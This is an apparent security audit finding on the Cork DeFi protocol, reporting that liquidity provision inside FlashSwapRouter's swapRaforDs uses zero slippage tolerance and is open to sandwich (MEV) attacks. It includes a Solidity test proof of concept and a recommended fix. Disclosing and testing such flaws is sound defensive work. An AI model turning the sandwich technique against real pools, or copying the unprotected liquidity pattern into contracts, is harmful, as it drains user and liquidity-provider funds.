---
tags:
  - lang/solidity
  - sector/dex
  - sector/lending
  - sector/token
  - platform/cantina
  - has/poc
  - severity/high
  - impact/data-corruption/price-manipulation
  - impact/mev/backrun
  - impact/mev/frontrun
  - impact/mev/sandwich
  - trigger/price-manipulation
  - trigger/sandwich-attack
protocol: "[[Cork]]"
auditors:
  - "[[Sujith Somraaj]]"
report: "https://cdn.cantina.xyz/reports/cantina_competition_cork_december2024.pdf"
genome:
  - "[[spot-price]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[backrun]]"
  - "[[frontrun]]"
  - "[[sandwich]]"
  - "[[trigger/price-manipulation]]"
  - "[[defi/sandwich-attack]]"
  - "[[fot-slippage]]"
  - "[[frontrun-exposure]]"
  - "[[oracle-manipulation-resistance]]"
  - "[[timestamp-dependence]]"
---
# Proﬁt distribution from reserve sales during swapRaforDs is susceptible to MEV attacks 

- id: 53127
- impact: HIGH
- protocol: [[Cork]]
- reporter: Sujith Somraaj (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_cork_december2024.pdf

## Summary


The bug report discusses an issue with the FlashSwapRouter.sol file, specifically with the swapRaforDs function. This function allows users to swap their RA (Redemption Asset) for Debt Swap (DS) tokens. However, there is a vulnerability in the code that allows bots to manipulate prices and steal profits through a technique called "front-running." This is done by calling the __provideLiquidityWithRatioGetDust function with 0 tolerance and using the block timestamp as a deadline. The report provides a proof of concept showing how this vulnerability can be exploited. The recommendation is to add slippage protection to the provideLiquidityWithFlashSwapFee function to prevent this issue. The bug has been fixed in a pull request (PR 280).

## Details

## FlashSwapRouter.sol Overview

## Context
FlashSwapRouter.sol#L340

## Description
The `swapRaforDs` function of `FlashSwapRouter.sol` allows users to swap their RA (Redemption Asset) for Debt Swap (DS) tokens. During this swap, if there are enough resources in the module core, they are utilized. The profits from trades involving the Redemption Asset (RA) are added as liquidity to the RA-CT pool through the `provideLiquidityWithFlashSwapFee` function.

### Function Calls
- `swapRaforDs`
- `_swapRaforDs`
- `_sellDsReserve`
- `provideLiquidityWithFlashSwapFee`
- `provideLiquidityWithFee`
- `__provideLiquidityWithRatio`
- `__provideLiquidityWithRatioGetDust` (0 tolerance and block.timestamp as deadline)

The liquidity provision using the `__provideLiquidityWithRatioGetDust` is called with 0 tolerance, and the deadline is set as `block.timestamp`. This setup allows sandwich attacks where bots can perform front-run transactions to manipulate prices, forcing the liquidity provision to execute at unfavorable rates, and then back-run to capture profits.

## Proof of Concept
From the following test, it can be noted that front-running the transaction by another action in the liquidity pool reduces LP tokens by 0.23 from 0.25 (~20%), which can be more severe under certain conditions.

```solidity
contract FlashSwapRouter is TestHelper {
    function setUp() public override {
        super.setUp();
    }

    function test_e22e() public {
        deal(address(ra), user, type(uint256).max);
        deal(address(pa), user, 200e18);
        deal(address(ra), address(router), 200e18);
        deal(address(ra), address(unlocker), type(uint256).max);
        console.log("----------- WITHOUT FRONT_RUNNING -------------");
        internal_all(false);
        // console.log("----------- WITH FRONT_RUNNING -------------");
        // internal_all(true);
    }

    function internal_all(bool withfrontrunning) internal {
        (address ct, address ds) = moduleCore.swapAsset(defaultCurrencyId, moduleCore.lastDsId(defaultCurrencyId));
        
        vm.startPrank(user);
        ERC20(ra).transfer(address(manager), 1e18);
        ra.approve(address(moduleCore), 200e18);
        moduleCore.depositPsm(defaultCurrencyId, 100e18);
        console.log("ct balance of user:", ERC20(ct).balanceOf(user));
        
        ra.approve(address(moduleCore), 200e18);
        moduleCore.depositLv(defaultCurrencyId, 10e18, 0, 0);
        console.log("ct balance of user 2:", ERC20(ct).balanceOf(user));
        
        ERC20 lv = ERC20(moduleCore.lvAsset(defaultCurrencyId));
        lv.approve(address(moduleCore), lv.balanceOf(user));
        
        ra.balanceOf(address(router));
        ERC20(ct).balanceOf(address(router));
        
        ra.approve(address(router), 100e18);
        
        IDsFlashSwapCore.BuyAprroxParams memory buyParams;
        buyParams.maxApproxIter = 256;
        buyParams.epsilon = 1e9;
        buyParams.feeIntervalAdjustment = 1e16;
        buyParams.precisionBufferPercentage = 1e16;
        
        uint256 amountOut;
        console.log("moduleCore ds balance:", ERC20(ds).balanceOf(address(moduleCore)));
        
        router.swapRaforDs(defaultCurrencyId, 1, 1e18, 0, buyParams);
        if (withfrontrunning) {
            ERC20(ds).approve(address(router), ERC20(ds).balanceOf(address(user)));
            router.swapDsforRa(defaultCurrencyId, 1, 1e18, 0);
        }
        
        uint256 balBefore = ERC20(ds).balanceOf(user);
        amountOut += router.swapRaforDs(defaultCurrencyId, 1, 1e18, 0, buyParams);
        uint256 balAfter = ERC20(ds).balanceOf(user);
        
        console.log("actual user amount out:", amountOut);
        assert(balAfter - balBefore == amountOut);
    }
}
```

## Recommendation
Consider adding slippage protection to the `provideLiquidityWithFlashSwapFee` function.

## Cork
Fixed in PR 280.
